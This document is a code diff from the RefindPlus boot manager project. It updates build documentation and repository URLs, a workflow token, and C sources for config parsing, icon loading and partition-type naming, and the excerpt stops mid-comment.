.github/workflows/manage_runs.yml:\n```\n@@ -17,7 +17,7 @@\njobs:\n     steps:\n       - uses: Mattraks/delete-workflow-runs@v2\n         with:\n-          token: ${{ secrets.PAT_TOKEN }}\n+          token: ${{ secrets.GITHUB_TOKEN }}\n           repository: ${{ github.repository }}\n           retain_days: 61\n           keep_minimum_runs: 0\n```\n\nFilename: BUILDING.md:\n```\n@@ -1,4 +1,31 @@\n-# BUILDING VIA DOCKER VIRTUALISATION\n+# REMOTE BUILD (GITHUB)\n+\n+RefindPlus can be built by leveraging GitHub's Workflow Artefact creation and storage capabilities. A GitHub `Workflow Action` is provided to facilitate this.\n+\n+- Navigate to https://github.com/RefindPlusRepos/RefindPlus and fork the repository.\n+- Navigate to `https://github.com/YOUR_GITHUB_USERNAME_GOES_HERE/RefindPlus.git`.\n+  - Enable Github Actions\n+    - Click on the `Settings` navigation option\n+    - Select the `Actions` configuration option\n+    - Allow actions under the `Actions` tab\n+  - Trigger Github Action\n+    - Click on the `Actions` navigation option.\n+    - Select the `Build Artefacts` workflow option.\n+    - Run the default build or use the dropdown for run options.\n+\n+**NB:** Replace `YOUR_GITHUB_USERNAME_GOES_HERE` above with your actual GitHub User Name.\n+\n+Once the action run is completed, click on the action instance displayed and look for `Artifacts` near the bottom of the page for available builds to download. The artefacts will be automatically removed from your repository fork after a period of time.\n+\n+**NB:** GitHub Actions may need to be explicitly enabled after forking a repository.\n+\n+<br><br>\n+\n+---\n+\n+<br><br>\n+\n+# LOCAL BUILD (DOCKER)\n \n RefindPlus can be built on any operating system environment that supports Docker virtualisation. A Docker image has been created by a third party developer and is available on the DockerHub website (https://hub.docker.com/r/xaionaro2/edk2-builder).\n Please refer to that project's repository (https://github.com/xaionaro/edk2-builder-docker) for details and support on this option.\n\n@@ -9,7 +36,7 @@\nPlease refer to that project's repository (https://github.com/xaionaro/edk2-buil\n \n <br><br>\n \n-# BUILDING NATIVELY ON MAC OS\n+# LOCAL BUILD (MAC OS)\n \n ## Python\n\n@@ -103,7 +130,7 @@\n$ brew install binutils && brew upgrade binutils\n \n ### Fork the RefindPlus Repository\n \n-Navigate to `https://github.com/dakanji/RefindPlus` and fork the repository.\n+Navigate to `https://github.com/RefindPlusRepos/RefindPlus` and fork the repository.\n \n ### Clone the Forked RefindPlus Repository\n\n@@ -113,7 +140,7 @@\nIn Terminal, clone the forked `RefindPlus` repository into a `RefindPlus/Working\n $ mkdir -p ~/Documents/RefindPlus && cd ~/Documents/RefindPlus\n $ git clone https://github.com/YOUR_GITHUB_USERNAME_GOES_HERE/RefindPlus.git Working\n $ cd ~/Documents/RefindPlus/Working && git checkout GOPFix\n-$ git remote add upstream https://github.com/dakanji/RefindPlus.git\n+$ (git remote get-url upstream 2>/dev/null | grep -q \"https://github.com/RefindPlusRepos/RefindPlus.git\") || (git remote remove upstream && git remote add upstream https://github.com/RefindPlusRepos/RefindPlus.git 2>/dev/null)\n ```\n \n **NB:** Replace `YOUR_GITHUB_USERNAME_GOES_HERE` above with your actual GitHub User Name.\n\n@@ -124,7 +151,7 @@\nYour local RefindPlus repository will be under `Documents/RefindPlus/Working`.\n \n ### Fork the RefindPlusUDK Repository\n \n-Navigate to `https://github.com/dakanji/RefindPlusUDK` and fork the repository\n+Navigate to `https://github.com/RefindPlusRepos/RefindPlusUDK` and fork the repository\n \n ### Clone the Forked RefindPlusUDK Repository\n\n@@ -134,7 +161,7 @@\nIn Terminal, clone the forked `RefindPlusUDK` repository into a `RefindPlus/edk2\n $ mkdir -p ~/Documents/RefindPlus && cd ~/Documents/RefindPlus\n $ git clone https://github.com/YOUR_GITHUB_USERNAME_GOES_HERE/RefindPlusUDK.git edk2\n $ cd ~/Documents/RefindPlus/edk2 && git checkout rudk\n-$ git remote add upstream https://github.com/dakanji/RefindPlusUDK.git\n+$ (git remote get-url upstream 2>/dev/null | grep -q \"https://github.com/RefindPlusRepos/RefindPlusUDK.git\") || (git remote remove upstream && git remote add upstream https://github.com/RefindPlusRepos/RefindPlusUDK.git 2>/dev/null)\n ```\n \n **NB:** Replace `YOUR_GITHUB_USERNAME_GOES_HERE` above with your actual GitHub User Name.\n\n@@ -175,6 +202,7 @@\nIf the script still fails after a third attempt, try the manual sync steps outli\n ```\n $ cd ~/Documents/RefindPlus/Working && git checkout GOPFix\n $ git reset --hard a2cc87f019c4de3a1237e2dc23f432c27cec5ec6\n+$ (git remote get-url upstream 2>/dev/null | grep -q \"https://github.com/RefindPlusRepos/RefindPlus.git\") || (git remote remove upstream && git remote add upstream https://github.com/RefindPlusRepos/RefindPlus.git 2>/dev/null)\n $ git push origin HEAD -f && git pull upstream GOPFix\n $ git push\n ```\n\n@@ -184,6 +212,7 @@\n$ git push\n ```\n $ cd ~/Documents/RefindPlus/edk2 && git checkout rudk\n $ git reset --hard a94082b4e5e42a1cfdcbab0516f9ecdbb596d201\n+$ (git remote get-url upstream 2>/dev/null | grep -q \"https://github.com/RefindPlusRepos/RefindPlusUDK.git\") || (git remote remove upstream && git remote add upstream https://github.com/RefindPlusRepos/RefindPlusUDK.git 2>/dev/null)\n $ git push origin HEAD -f && git pull upstream rudk\n $ git push\n ```\n```\n\nFilename: BootMaster/apple.c:\n```\n@@ -331,7 +331,6 @@\nVOID RotateCsrValue (\n     }\n     #endif\n \n-    AccessFlagsFull |= EFI_VARIABLE_NON_VOLATILE;\n     Status = (TargetCsr != 0)\n         ? EfivarSetRaw (\n             &AppleBootGuid, L\"csr-active-config\",\n```\n\nFilename: BootMaster/config.c:\n```\n@@ -494,10 +494,11 @@\nVOID HandleHexes (\n     } // for\n } // static VOID HandleHexes()\n \n-// Convert TimeString (in \"HH:MM\" format) to a pure-minute format. Values should be\n-// in the range from 0 (for 00:00, or midnight) to 1439 (for 23:59; aka LAST_MINUTE).\n-// Any value outside that range denotes an error in the specification. Note that the\n-// input value is returned in \"UINTN\" form if it is a number without a colon.\n+// Convert TimeString (in \"HH:MM\" format) to a pure-minute format.\n+// Values should be in the range between 0 (for 00:00, or midnight)\n+// and 1439 (for 23:59; aka LAST_MINUTE) inclusive.\n+// Any value outside this range is a specification error.\n+// Input value as number without a colon is returned in \"UINTN\" form.\n static\n UINTN HandleTime (\n     IN CHAR16 *TimeString\n\n@@ -522,7 +523,7 @@\nUINTN HandleTime (\n             Minute += (TimeString[i] - L'0');\n         }\n \n-        i++;\n+        i += 1;\n     } // while\n \n     TimeMinutes =  (Hour == 0)\n\n@@ -621,6 +622,92 @@\nVOID SetDefaultByTime (\n     } // if StartTime <= LAST_MINUTE\n } // static VOID SetDefaultByTime()\n \n+// Determine volume associated with stanza\n+// Return 'NULL' if stanza is disabled\n+static\n+BOOLEAN GetIsDisabled (\n+    REFIT_FILE   *File\n+) {\n+    UINTN           SubMenus;\n+    UINTN           NumToken;\n+    CHAR8          *FilePtr08;\n+    CHAR16         *FilePtr16;\n+    CHAR16        **TokenList;\n+    BOOLEAN         IsExitLoop;\n+    BOOLEAN         IsDisabled;\n+    BOOLEAN         IsContinue;\n+\n+\n+    SubMenus      =      0;\n+    IsExitLoop    =  FALSE;\n+    IsDisabled    =  FALSE;\n+\n+    // Store original TokenLine pointers\n+    FilePtr08 = File->Current8Ptr;\n+    FilePtr16 = File->Current16Ptr;\n+\n+    for (;;) {\n+        IsContinue = FALSE;\n+\n+        NumToken = ReadTokenLine (File, &TokenList);\n+        if (NumToken == 0) {\n+            IsExitLoop = TRUE;\n+        }\n+        else if (MyStriCmp (TokenList[0], L\"}\")) {\n+            if (SubMenus < 1) {\n+                IsExitLoop = TRUE;\n+            }\n+            else {\n+                SubMenus -= 1;\n+                IsContinue = TRUE;\n+            }\n+        }\n+        else if (MyStriCmp (TokenList[0], L\"submenuentry\")) {\n+            SubMenus += 1;\n+            IsContinue = TRUE;\n+        }\n+        else if (IsDisabled || SubMenus > 0) {\n+            IsContinue = TRUE;\n+        }\n+\n+        if (!IsExitLoop &&\n+            !IsContinue &&\n+            !MyStriCmp (TokenList[0], L\"disabled\")\n+        ) {\n+            IsContinue = TRUE;\n+        }\n+\n+        if (IsExitLoop || IsContinue) {\n+            FreeTokenLine (&TokenList, &NumToken);\n+\n+            if (IsExitLoop) {\n+                break;\n+            }\n+\n+            continue;\n+        }\n+\n+        if (MyStriCmp (TokenList[0], L\"disabled\")) {\n+            IsDisabled = TRUE;\n+        }\n+\n+        FreeTokenLine (&TokenList, &NumToken);\n+    } // for ;;\n+\n+    if (IsDisabled) {\n+        // Return NULL without restoring TokenLine pointers\n+        // Continues in Caller from current line\n+        return TRUE;\n+    }\n+\n+    // Restore original TokenLine pointers\n+    // Continues in Caller with original line\n+    File->Current8Ptr  = FilePtr08;\n+    File->Current16Ptr = FilePtr16;\n+\n+    return FALSE;\n+} // static BOOLEAN GetIsDisabled()\n+\n // Determine volume associated with stanza\n // Return 'NULL' if stanza is disabled\n static\n\n@@ -704,6 +791,12 @@\nREFIT_VOLUME * GetStanzaVolume (\n             continue;\n         }\n \n+        IsDisabled = GetIsDisabled (File);\n+        if (IsDisabled) {\n+            FreeTokenLine (&TokenList, &NumToken);\n+\n+            break;\n+        }\n \n         #if REFIT_DEBUG > 0\n         ALT_LOG(1, LOG_THREE_STAR_MID, L\"Handle Token:- 'volume'\");\n\n@@ -1646,17 +1739,9 @@\nVOID ExitOuter (\n         GlobalConfig.NvramProtectEx = FALSE;\n     }\n \n-    if (GlobalConfig.EnableMouse ||\n-        GlobalConfig.EnableTouch\n-    ) {\n-        // Force 'RescanDXE' for these\n-        // Override Previous Outcomes\n-        GlobalConfig.RescanDXE = TRUE;\n-\n-        if (GlobalConfig.EnableTouch) {\n-            // Disable Mouse if Touch Active\n-            GlobalConfig.EnableMouse = FALSE;\n-        }\n+    if (GlobalConfig.EnableTouch) {\n+        // Disable Mouse if Touch Active\n+        GlobalConfig.EnableMouse = FALSE;\n     }\n \n     if (GlobalConfig.SyncTrust  != ENFORCE_TRUST_NONE) {\n\n@@ -2681,14 +2766,15 @@\nVOID ReadConfig (\n                     }\n                     else {\n                         if (0);\n-                        else if (MyStriCmp (TokenList[i], L\"osx\"     )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_OSX;\n-                        else if (MyStriCmp (TokenList[i], L\"grub\"    )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_GRUB;\n-                        else if (MyStriCmp (TokenList[i], L\"tools\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_TOOLS;\n-                        else if (MyStriCmp (TokenList[i], L\"linux\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_LINUX;\n-                        else if (MyStriCmp (TokenList[i], L\"elilo\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_ELILO;\n-                        else if (MyStriCmp (TokenList[i], L\"clover\"  )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_CLOVER;\n-                        else if (MyStriCmp (TokenList[i], L\"windows\" )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_WINDOWS;\n-                        else if (MyStriCmp (TokenList[i], L\"opencore\")) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_OPENCORE;\n+                        else if (MyStriCmp (Flag, L\"osx\"     )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_OSX;\n+                        else if (MyStriCmp (Flag, L\"grub\"    )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_GRUB;\n+                        else if (MyStriCmp (Flag, L\"tools\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_TOOLS;\n+                        else if (MyStriCmp (Flag, L\"linux\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_LINUX;\n+                        else if (MyStriCmp (Flag, L\"elilo\"   )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_ELILO;\n+                        else if (MyStriCmp (Flag, L\"clover\"  )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_CLOVER;\n+                        else if (MyStriCmp (Flag, L\"systemd\" )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_SYSTEMD;\n+                        else if (MyStriCmp (Flag, L\"windows\" )) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_WINDOWS;\n+                        else if (MyStriCmp (Flag, L\"opencore\")) GlobalConfig.GraphicsFor |= GRAPHICS_FOR_OPENCORE;\n                     }\n                 }\n             } // for\n```\n\nFilename: BootMaster/global.h:\n```\n@@ -338,6 +338,7 @@\nEFI\\\\OEM\\\\Boot\\\\bootmgfw.efi\"\n \n #define NULL_GUID_VALUE              {0x00000000, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};\n #define SWAP_GUID_VALUE              {0x0657FD6D, 0xA4AB, 0x43C4, {0x84, 0xE5, 0x09, 0x33, 0xC8, 0x4B, 0x4F, 0x4F}};\n+#define HOME_GUID_VALUE              {0x933AC7E1, 0x2EB4, 0x4F13, {0xB8, 0x44, 0x0E, 0x14, 0xE2, 0xAE, 0xF9, 0x15}};\n #define LUKS_GUID_VALUE              {0xCA7D7CCB, 0x63ED, 0x4C53, {0x86, 0x1C, 0x17, 0x42, 0x53, 0x60, 0x59, 0xCC}};\n #define MBR_GUID_VALUE               {0x92A6C61F, 0x7130, 0x49B9, {0xB0, 0x5C, 0x8D, 0x7E, 0x7B, 0x03, 0x91, 0x27}};\n #define REFINDPLUS_GUID              {0x36D08FA7, 0xCF0B, 0x42F5, {0x8F, 0x14, 0x68, 0xDF, 0x73, 0xED, 0x37, 0x40}};\n```\n\nFilename: BootMaster/icns.c:\n```\n@@ -207,12 +207,16 @@\nEG_IMAGE * BuiltinIcon (\n //\n \n static\n-VOID UpdateBaseIcon (\n+INTN UpdateBaseIcon (\n     IN     CHAR16    *BaseName,\n-    IN OUT EG_IMAGE **Image\n+    IN OUT EG_IMAGE **Image,\n+    IN     INTN       InID\n ) {\n+    UINTN             Index;\n+    INTN              RetId;\n+\n     if (*Image != NULL) {\n-        return;\n+        return InID;\n     }\n \n     #if REFIT_DEBUG > 0\n\n@@ -225,7 +229,22 @@\nVOID UpdateBaseIcon (\n     *Image = egFindIcon (\n         BaseName, GlobalConfig.IconSizes[ICON_SIZE_BIG]\n     );\n-} // static VOID UpdateBaseIcon()\n+\n+    RetId = -1;\n+    if (*Image != NULL) {\n+        for (Index = 0; Index < BASE_OS_ICON_COUNT; Index++) {\n+            if (TableBuiltinIconOS[Index].Image == NULL &&\n+                MyStriCmp (BaseName, TableBuiltinIconOS[Index].FileName)\n+            ) {\n+                RetId = Index;\n+\n+                break;\n+            }\n+        } // for\n+    }\n+\n+    return RetId;\n+} // static INTN UpdateBaseIcon()\n \n static\n EG_IMAGE * LoadIndexedIcon (\n\n@@ -266,8 +285,7 @@\nINTN CheckTheCache (\n         for (Index = 0; Index < BASE_OS_ICON_COUNT; Index++) {\n             *Image = LoadIndexedIcon (BaseName, Index);\n             if (*Image != NULL) {\n-                RetId = (Index < BASE_OS_ICON_COUNT)\n-                    ? Index : (BASE_OS_ICON_COUNT - 1);\n+                RetId = Index;\n \n                 break;\n             }\n\n@@ -298,7 +316,9 @@\nEG_IMAGE * LoadOSIcon (\n         return NULL;\n     }\n \n-    if (BootLogo && GlobalConfig.DisableBootLogo == DISABLE_BOOTLOGO_ALL) {\n+    if (BootLogo &&\n+        GlobalConfig.DisableBootLogo == DISABLE_BOOTLOGO_ALL\n+    ) {\n         return NULL;\n     }\n\n@@ -311,7 +331,10 @@\nEG_IMAGE * LoadOSIcon (\n         OurId =   -1;\n         Image = NULL;\n         do {\n-            CutoutName = FindCommaDelimited (OSIconName, Index++);\n+            if (OSIconName == NULL) break;\n+            CutoutName = FindCommaDelimited (\n+                OSIconName, Index++\n+            );\n             if (CutoutName == NULL) break;\n \n             BaseName = PoolPrint (\n\n@@ -323,10 +346,14 @@\nEG_IMAGE * LoadOSIcon (\n             // Skip cache check if BootLogo is set.\n             // BootLogo is not cached.\n             if (!BootLogo) {\n-                OurId = CheckTheCache (BaseName, &Image);\n+                OurId = CheckTheCache (\n+                    BaseName, &Image\n+                );\n             }\n \n-            UpdateBaseIcon (BaseName, &Image);\n+            OurId = UpdateBaseIcon (\n+                BaseName, &Image, OurId\n+            );\n \n             MY_FREE_POOL(BaseName);\n             MY_FREE_POOL(CutoutName);\n\n@@ -337,16 +364,22 @@\nEG_IMAGE * LoadOSIcon (\n         if (!LoadCustom && BootLogo) {\n             Index = 0;\n             do {\n-                CutoutName = FindCommaDelimited (OSIconName, Index++);\n+                if (OSIconName == NULL) break;\n+                CutoutName = FindCommaDelimited (\n+                    OSIconName, Index++\n+                );\n                 if (CutoutName == NULL) break;\n \n                 BaseName = PoolPrint (\n                     L\"os_%s\",\n                     CutoutName\n                 );\n+\n                 // No cache check as BootLogo is set.\n                 // BootLogo is not cached.\n-                UpdateBaseIcon (BaseName, &Image);\n+                OurId = UpdateBaseIcon (\n+                    BaseName, &Image, OurId\n+                );\n \n                 MY_FREE_POOL(BaseName);\n                 MY_FREE_POOL(CutoutName);\n\n@@ -363,9 +396,14 @@\nEG_IMAGE * LoadOSIcon (\n         // BootLogo is not cached.\n         // Skip cache check if BootLogo is set.\n         if (!BootLogo) {\n-            OurId = CheckTheCache (BaseName, &Image);\n+            OurId = CheckTheCache (\n+                BaseName, &Image\n+            );\n         }\n-        UpdateBaseIcon (BaseName, &Image);\n+\n+        OurId = UpdateBaseIcon (\n+            BaseName, &Image, OurId\n+        );\n         MY_FREE_POOL(BaseName);\n         if (Image != NULL) break;\n\n@@ -376,26 +414,40 @@\nEG_IMAGE * LoadOSIcon (\n                 (BootLogo) ? L\"boot\" : L\"os\",\n                 L\"win\"\n             );\n+\n             // BootLogo is not cached.\n             // Skip cache check if BootLogo is set.\n             if (!BootLogo) {\n-                OurId = CheckTheCache (BaseName, &Image);\n+                OurId = CheckTheCache (\n+                    BaseName, &Image\n+                );\n             }\n-            UpdateBaseIcon (BaseName, &Image);\n+\n+            OurId = UpdateBaseIcon (\n+                BaseName, &Image, OurId\n+            );\n             MY_FREE_POOL(BaseName);\n             if (Image != NULL) break;\n         }\n \n         if (BootLogo) {\n             /* Try with 'os_' if BootLogo was set but not 'LoadCustom'. */\n             if (!LoadCustom) {\n-                BaseName = PoolPrint (L\"os_%s\", FallbackIconName);\n-                UpdateBaseIcon (BaseName, &Image);\n+                BaseName = PoolPrint (\n+                    L\"os_%s\",\n+                    FallbackIconName\n+                );\n+\n+                OurId = UpdateBaseIcon (\n+                    BaseName, &Image, OurId\n+                );\n                 MY_FREE_POOL(BaseName);\n \n                 if (Image == NULL && WinAltIcon) {\n                     // Try 'os_win' if 'WinAltIcon' is set.\n-                    UpdateBaseIcon (L\"os_win\", &Image);\n+                    OurId = UpdateBaseIcon (\n+                        L\"os_win\", &Image, OurId\n+                    );\n                 }\n             }\n\n@@ -413,7 +465,9 @@\nEG_IMAGE * LoadOSIcon (\n                 );\n             }\n \n-            UpdateBaseIcon (BaseName, &Image);\n+            OurId = UpdateBaseIcon (\n+                BaseName, &Image, OurId\n+            );\n             MY_FREE_POOL(BaseName);\n \n             if (Image != NULL) {\n```\n\nFilename: BootMaster/lib.c:\n```\n@@ -90,13 +90,13 @@\nEFI_DEVICE_PATH_PROTOCOL EndDevicePath[] = {\n #define FAT32_SIGNATURE                  \"FAT32   \"\n \n #if defined (EFIX64)\n-EFI_GUID gFreedesktopRootGuid = {0x4f68bce3, 0xe8cd, 0x4db1, {0x96, 0xe7, 0xfb, 0xca, 0xf9, 0x84, 0xb7, 0x09}};\n+EFI_GUID gRootGuid = {0x4f68bce3, 0xe8cd, 0x4db1, {0x96, 0xe7, 0xfb, 0xca, 0xf9, 0x84, 0xb7, 0x09}};\n #elif defined (EFI32)\n-EFI_GUID gFreedesktopRootGuid = {0x44479540, 0xf297, 0x41b2, {0x9a, 0xf7, 0xd1, 0x31, 0xd5, 0xf0, 0x45, 0x8a}};\n+EFI_GUID gRootGuid = {0x44479540, 0xf297, 0x41b2, {0x9a, 0xf7, 0xd1, 0x31, 0xd5, 0xf0, 0x45, 0x8a}};\n #elif defined (EFIAARCH64)\n-EFI_GUID gFreedesktopRootGuid = {0xb921b045, 0x1df0, 0x41c3, {0xaf, 0x44, 0x4c, 0x6f, 0x28, 0x0d, 0x3f, 0xae}};\n+EFI_GUID gRootGuid = {0xb921b045, 0x1df0, 0x41c3, {0xaf, 0x44, 0x4c, 0x6f, 0x28, 0x0d, 0x3f, 0xae}};\n #else //  GUID for ARM32 is Below\n-EFI_GUID gFreedesktopRootGuid = {0x69dad710, 0x2ce4, 0x4e3c, {0xb1, 0x6c, 0x21, 0xa1, 0xd4, 0x9a, 0xbe, 0xd3}};\n+EFI_GUID gRootGuid = {0x69dad710, 0x2ce4, 0x4e3c, {0xb1, 0x6c, 0x21, 0xa1, 0xd4, 0x9a, 0xbe, 0xd3}};\n #endif\n \n // Macros\n\n@@ -171,6 +171,7 @@\nEFI_GUID                    GuidHFS                  =              HFS_GUID_VAL\n EFI_GUID                    GuidAPFS                 =             APFS_GUID_VALUE;\n EFI_GUID                    GuidNull                 =             NULL_GUID_VALUE;\n EFI_GUID                    GuidSwap                 =             SWAP_GUID_VALUE;\n+EFI_GUID                    GuidHome                 =             HOME_GUID_VALUE;\n EFI_GUID                    GuidLuks                 =             LUKS_GUID_VALUE;\n EFI_GUID                    GuidLinux                =            LINUX_GUID_VALUE;\n EFI_GUID                    GuidBasicData            =       BASIC_DATA_GUID_VALUE;\n\n@@ -181,7 +182,7 @@\nEFI_GUID                    GuidMacRaidOff           =     MAC_RAID_OFF_GUID_VAL\n EFI_GUID                    GuidReservedMS           =    MSFT_RESERVED_GUID_VALUE;\n EFI_GUID                    GuidWindowsRE            = WIN_RECOVERY_ENV_GUID_VALUE;\n EFI_GUID                    GuidRecoveryHD           =  MAC_RECOVERY_HD_GUID_VALUE;\n-EFI_GUID                    GuidContainerHFS         =    CONTAINER_HFS_GUID_VALUE;\n+EFI_GUID                    GuidContainHFS           =    CONTAINER_HFS_GUID_VALUE;\n \n \n extern EFI_GUID             RefindPlusOldGuid;\n\n@@ -735,7 +736,7 @@\nEFI_STATUS FindVarsDir (VOID) {\n         #if REFIT_DEBUG > 0\n         ALT_LOG(1, LOG_BLANK_LINE_SEP, L\"X\");\n         ALT_LOG(1, LOG_LINE_NORMAL,\n-            L\"Locate Upstream %s for RefindPlus-Specific Items ... In Installation Folder:- '%r'\",\n+            L\"Locate Upstream %s for RefindPlus-specific Items ... In Installation Folder:- '%r'\",\n             NVRAM_EMULATED, Status\n         );\n         #endif\n\n@@ -753,7 +754,7 @@\nEFI_STATUS FindVarsDir (VOID) {\n     #if REFIT_DEBUG > 0\n     ALT_LOG(1, LOG_BLANK_LINE_SEP, L\"X\");\n     ALT_LOG(1, LOG_LINE_NORMAL,\n-        L\"Locate/Create %s for RefindPlus-Specific Items ... In Installation Folder:- '%r'\",\n+        L\"Locate/Create %s for RefindPlus-specific Items ... In Installation Folder:- '%r'\",\n         NVRAM_EMULATED, Status\n     );\n     #endif\n\n@@ -773,7 +774,7 @@\nEFI_STATUS FindVarsDir (VOID) {\n \n     #if REFIT_DEBUG > 0\n     ALT_LOG(1, LOG_LINE_NORMAL,\n-        L\"Locate/Create %s for RefindPlus-Specific Items ... In First Available ESP:- '%r'\",\n+        L\"Locate/Create %s for RefindPlus-specific Items ... In First Available ESP:- '%r'\",\n         NVRAM_EMULATED, Status\n     );\n\n@@ -1354,11 +1355,12 @@\nCHAR16 * FSTypeName (\n         retval = (FoundVentoy) ? L\"ExFAT (Assumed)\" : L\"NTFS (Assumed)\";\n     }\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidReservedMS)) retval = L\"NTFS (Assumed)\"  ;\n-    else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidBasicData )) retval = L\"NTFS (Assumed)\"  ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidWindowsRE )) retval = L\"NTFS (Assumed)\"  ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidESP       )) retval = L\"FAT-32 (Assumed)\";\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLinux     )) retval = L\"Ext4 (Assumed)\"  ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidRecoveryHD)) retval = L\"HFS+ (Assumed)\"  ;\n+    else if (GuidsAreEqual (&(Volume->PartTypeGuid), &gRootGuid     )) retval = L\"Linux Root\"      ;\n+    else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidHome      )) retval = L\"Linux Home\"      ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidSwap      )) retval = L\"Linux Swap\"      ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLuks      )) retval = L\"LUKS Encrypted\"  ;\n     else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidMacRaidOn )) retval = L\"Apple Raid (ON)\" ;\n\n@@ -2072,7 +2074,7 @@\nVOID SetPartGuidAndName (\n         PartInfo->type_guid, sizeof (EFI_GUID)\n     );\n \n-    if (GuidsAreEqual (&(Volume->PartTypeGuid), &gFreedesktopRootGuid) &&\n+    if (GuidsAreEqual (&(Volume->PartTypeGuid), &gRootGuid) &&\n         ((PartInfo->attributes & GPT_NO_AUTOMOUNT) == 0)\n     ) {\n         GlobalConfig.DiscoveredRoot = Volume;\n\n@@ -2144,33 +2146,16 @@\nCHAR16 * GetVolumeNameEx (\n         FoundName = StrDuplicate (L\"Network Volume (Assumed)\");\n     }\n     else {\n-        if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidAPFS)) {\n-            FoundName = StrDuplicate (L\"APFS/FileVault Container\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidRecoveryHD)) {\n-            FoundName = StrDuplicate (L\"Recovery HD\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLinux)) {\n-            FoundName = StrDuplicate (L\"Linux Volume\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidReservedMS)) {\n-            FoundName = StrDuplicate (L\"Microsoft Reserved Partition\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidMacRaidOn)) {\n-            FoundName = StrDuplicate (L\"Apple Raid Partition (Online)\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidMacRaidOff)) {\n-            FoundName = StrDuplicate (L\"Apple Raid Partition (Offline)\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidContainerHFS)) {\n-            FoundName = StrDuplicate (L\"Fusion/FileVault Container\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidApplTvRec)) {\n-            FoundName = StrDuplicate (L\"AppleTV Recovery Partition\");\n-        }\n-        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidHFS)) {\n-            FoundName = StrDuplicate (L\"Unidentified HFS+ Partition\");\n-        }\n+        if (0);\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidAPFS      )) FoundName = StrDuplicate (L\"APFS/FileVault Container\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidESP       )) FoundName = StrDuplicate (L\"EFI System Partition\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLinux     )) FoundName = StrDuplicate (L\"Linux Volume\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidRecoveryHD)) FoundName = StrDuplicate (L\"Recovery HD\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidReservedMS)) FoundName = StrDuplicate (L\"Microsoft Reserved Partition\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidMacRaidOn )) FoundName = StrDuplicate (L\"Apple Raid Partition (Online)\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidMacRaidOff)) FoundName = StrDuplicate (L\"Apple Raid Partition (Offline)\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidContainHFS)) FoundName = StrDuplicate (L\"Fusion/FileVault Container\");\n+        else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidApplTvRec )) FoundName = StrDuplicate (L\"AppleTV Recovery Partition\");\n         else {\n             // Do *NOT* Free ... 'FSTypeName' returns a constant\n             TypeName = FSTypeName (Volume);\n\n@@ -2179,18 +2164,26 @@\nCHAR16 * GetVolumeNameEx (\n                 FoundName = StrDuplicate (L\"APFS Volume (Assumed)\");\n             }\n             else {\n-                // Try to use fs type and size as name\n-                FileSystemInfoPtr = (Volume->RootDir != NULL)\n-                    ? LibFileSystemInfo (Volume->RootDir) : NULL;\n-                if (FileSystemInfoPtr != NULL) {\n-                    SISize    = SizeInIEEEUnits (FileSystemInfoPtr->VolumeSize);\n-                    FoundName = PoolPrint (L\"%s %s Volume\", SISize, TypeName);\n-                    MY_FREE_POOL(FileSystemInfoPtr);\n-                    MY_FREE_POOL(SISize);\n-                }\n+                if (0);\n+                else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidHFS  )) FoundName = StrDuplicate (L\"Unidentified HFS+ Partition\");\n+                else if (GuidsAreEqual (&(Volume->PartTypeGuid), &gRootGuid)) FoundName = StrDuplicate (L\"Linux Root Volume\");\n+                else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidHome )) FoundName = StrDuplicate (L\"Linux Home Volume\");\n+                else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidSwap )) FoundName = StrDuplicate (L\"Linux Swap Volume\");\n+                else if (GuidsAreEqual (&(Volume->PartTypeGuid), &GuidLuks )) FoundName = StrDuplicate (L\"Encrypted Linux Volume\");\n+                else {\n+                    // Try to use fs type and 